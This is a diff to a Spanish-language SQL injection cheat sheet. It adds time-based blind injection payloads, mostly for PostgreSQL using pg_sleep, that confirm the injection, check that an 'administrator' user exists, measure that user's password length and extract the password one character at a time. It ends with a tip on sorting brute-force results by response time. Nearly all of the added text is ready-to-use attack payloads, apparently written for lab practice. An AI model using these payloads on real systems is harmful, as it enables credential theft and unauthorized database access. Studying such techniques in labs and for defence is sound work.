@@ -392,7 +392,7 @@ Cuando las técnicas anteriroes fallaron y no generaron algún tipo de comporatm
 Consulta base:
 SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx'
 
-Ejemplo PostgreSQL
+Ejemplo BASE PostgreSQL
 '|| (SELECT pg_sleep(10))--
 SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx'|| (SELECT pg_sleep(10))--'
 
@@ -402,6 +402,31 @@ SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx'|| (select dbms_pipe.receive
 
 '; IF (1=2) WAITFOR DELAY '0:0:10'--
 ```
+### Concatenación de retrasos de tiempo aplicados - Condicional Verdadero y Falso
+```
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE '' END)||'
+'||(SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE '' END)||'
+```
+
+### Concatenación de retrasos de tiempo aplicados - Verificar Usuario
+```
+'||(SELECT CASE WHEN username = 'administrator' THEN pg_sleep(10) ELSE '' END FROM users LIMIT 1)||' Si funciona 
+'||(SELECT CASE WHEN username = 'administratggdfor' THEN pg_sleep(10) ELSE '' END FROM users LIMIT 1)||' Si funciona no da respuesta de 10 segundos
+
+Consulta Alternativa no concatenada
+X';SELECT CASE WHEN (USERNAME='ADMINISTRATOR') THEN PG_SLEEP(10) ELSE PG_SLEEP(0) END FROM USERS--
+```
+### Concatenación de retrasos de tiempo aplicados - Tamaño o longitud de un parametro
+```
+'||(SELECT CASE WHEN LENGTH(password)>$1$ THEN pg_sleep(10) ELSE '' END FROM users WHERE username='administrator')||'
+';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>$1$) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+```
+### Concatenación de retrasos de tiempo aplicados - Enumeración deun parametro
+```
+'||(SELECT CASE WHEN SUBSTRING(password,1,1)='§a§' THEN pg_sleep(10) ELSE '' END FROM users WHERE username='administrator')||'
+';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+```
+**NOTA: Para la enumeración ordena el filtrador por el tiempo de respuesta, seleccionalo, cambia de color y filtrar solo los coloreados, despues ordena por payload numerico y copia la columna con CTRL + Clic para copiar toda el parametro**
 
 # Final
 Cheat Sheet
